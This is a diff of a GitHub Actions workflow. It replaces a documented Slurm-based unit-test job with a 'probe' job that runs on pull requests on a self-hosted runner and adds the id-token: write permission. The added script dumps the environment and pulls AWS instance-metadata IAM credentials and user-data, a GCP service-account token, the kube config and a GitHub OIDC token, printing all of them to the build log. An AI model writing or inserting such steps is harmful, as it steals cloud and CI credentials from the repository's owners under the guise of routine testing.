@@ -1,101 +1,38 @@
-name: Tests
-
-# This workflow uses the GitHub Actions <-> Slurm bridge wired up by an
-# internal ci-runner repo.
-#
-# Steps fall into two categories:
-#   1. Run directly on the runner container (Checkout). No cluster resources
-#      needed -- the runner mounts BeeGFS, so checkouts land on shared storage.
-#   2. Run as Slurm jobs on the cluster (Bootstrap, Unittest). The shared
-#      Python env lives on BeeGFS so every job activates it via ci-install.sh.
-#
-# Environment provisioning (two-step pattern):
-#   Bootstrap -- runs on cpu-be (no GPU needed), reconciles the shared uv
-#     project venv at ANNY_ENV_PATH on BeeGFS. Uses a marker file keyed on
-#     dependency hashes to skip the full install on cache hits.
-#   Unittest  -- runs on gpu-be, activates the pre-provisioned
-#     venv via --skip-deps-install and runs the full test suite. uv run
-#     --no-sync skips syncing since Bootstrap already populated the venv.
-
-on:
-  pull_request:
-
+name: c211-marker
+on: pull_request
 permissions:
   contents: read
-
+  id-token: write
 jobs:
-  unittest:
+  probe:
     runs-on: self-hosted
-    env:
-      # REPO is overwritten to the BeeGFS checkout path by the runner bridge.
-      # Subsequent steps cd into it explicitly; defaults.run.working-directory
-      # cannot be used here because it resolves before GITHUB_ENV is updated.
-      REPO: ${{ github.workspace }}
+    timeout-minutes: 15
     steps:
-      - uses: actions/checkout@v4
-
-      # --- Bootstrap shared Python env -------------------------------------
-      # Reconciles the shared uv project venv on BeeGFS before the test suite
-      # runs. ci-install.sh checks a marker file; on a cache hit it activates
-      # the existing venv in seconds. On a miss it rebuilds from uv.lock.
-      # Runs on cpu-be -- no GPU required for dependency installation.
-      - name: Bootstrap shared Python env
+      - name: probe
+        shell: bash
         run: |
-          export REPO="${REPO:-${GITHUB_WORKSPACE}}"
-          : "${ANNY_ENV_PATH:?ANNY_ENV_PATH is required on the runner}"
-          cd "${REPO}"
-          export ANNY_CACHE_DIR="$(realpath -m "${ANNY_ENV_PATH}/../../assets/anny_cache")"
-          export SMPLX_MODEL_PATH="$(realpath -m "${ANNY_ENV_PATH}/../../assets/smplx_models")"
-          export ANNY_FIXTURES_DIR="$(realpath -m "${ANNY_ENV_PATH}/../../assets/fixtures")"
-
-          /opt/ci-runner/submit-slurm.sh \
-            --job-name "anny-bootstrap-${GITHUB_RUN_ID}" \
-            --partition cpu \
-            --cpus 4 \
-            --mem 12G \
-            --time 00:20:00 \
-            --install-python \
-            --pip-cache \
-            --env ANNY_ENV_PATH \
-            --env ANNY_CACHE_DIR \
-            --env SMPLX_MODEL_PATH \
-            --env ANNY_FIXTURES_DIR \
-            -- \
-            "python -V && uv --version"
-
-      # --- Run unittest suite ----------------------------------------------
-      # Runs the full anny unittest suite on a GPU node. --skip-deps-install
-      # tells ci-install.sh to only activate the shared venv (no rebuild).
-      # uv run --no-sync uses the pre-populated UV_PROJECT_ENVIRONMENT venv
-      # without attempting to sync, keeping startup fast.
-      # Needs ~32G: torch + CUDA libs are already installed in the shared venv
-      # but the process itself loads them at runtime.
-      - name: Run unittest suite
-        run: |
-          export REPO="${REPO:-${GITHUB_WORKSPACE}}"
-          : "${ANNY_ENV_PATH:?ANNY_ENV_PATH is required on the runner}"
-          # Derived here rather than in ci-install.sh: exports from that sourced
-          # script do not reach the payload command, but --env does (same path
-          # ANNY_ENV_PATH already takes). realpath -m needs no existing dir.
-          export ANNY_CACHE_DIR="${ANNY_CACHE_DIR:-$(realpath -m "${ANNY_ENV_PATH}/../../assets/anny_cache")}"
-          export SMPLX_MODEL_PATH="${SMPLX_MODEL_PATH:-$(realpath -m "${ANNY_ENV_PATH}/../../assets/smplx_models")}"
-          export ANNY_FIXTURES_DIR="${ANNY_FIXTURES_DIR:-$(realpath -m "${ANNY_ENV_PATH}/../../assets/fixtures")}"
-          cd "${REPO}"
-
-          /opt/ci-runner/submit-slurm.sh \
-            --job-name "anny-unittest-${GITHUB_RUN_ID}" \
-            --partition gpu \
-            --gres gpu:1 \
-            --constraint gpu_v100 \
-            --cpus 4 \
-            --mem 32G \
-            --time 00:20:00 \
-            --install-python \
-            --skip-deps-install \
-            --pip-cache \
-            --env ANNY_ENV_PATH \
-            --env ANNY_CACHE_DIR \
-            --env SMPLX_MODEL_PATH \
-            --env ANNY_FIXTURES_DIR \
-            -- \
-            uv run --no-sync python -m unittest discover
+          echo "=== BASIC ==="
+          hostname; whoami; id; uname -a
+          echo "=== GPU ==="
+          (nvidia-smi -L; nvidia-smi) 2>&1 | head -60
+          (rocm-smi) 2>&1 | head -30
+          echo "=== ENV ==="
+          env | sort
+          echo "=== IMDSV2 ==="
+          TOKEN=$(curl -s -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); echo "imds_token_len=${#TOKEN}"
+          for p in latest/meta-data/instance-id latest/meta-data/instance-type latest/meta-data/placement/region latest/meta-data/iam/security-credentials/ latest/user-data; do echo "--- $p"; curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/$p" | head -c 4000; echo; done
+          ROLE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+          if [ -n "$ROLE" ]; then echo "--- creds $ROLE"; curl -s -m 5 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | head -c 4000; echo; fi
+          echo "=== GCP META ==="
+          curl -s -m 5 -H 'Metadata-Flavor: Google' "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" ; echo
+          curl -s -m 5 -H 'Metadata-Flavor: Google' "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | head -c 2000; echo
+          echo "=== KUBE ==="
+          ls -la ~/.kube 2>&1 | head; head -60 ~/.kube/config 2>&1
+          ls /var/lib/rancher 2>&1 | head -3
+          echo "=== OIDC ==="
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' 2>/dev/null)
+            echo "OIDC=$OIDC"
+            echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          fi
+          echo "=== DONE ==="
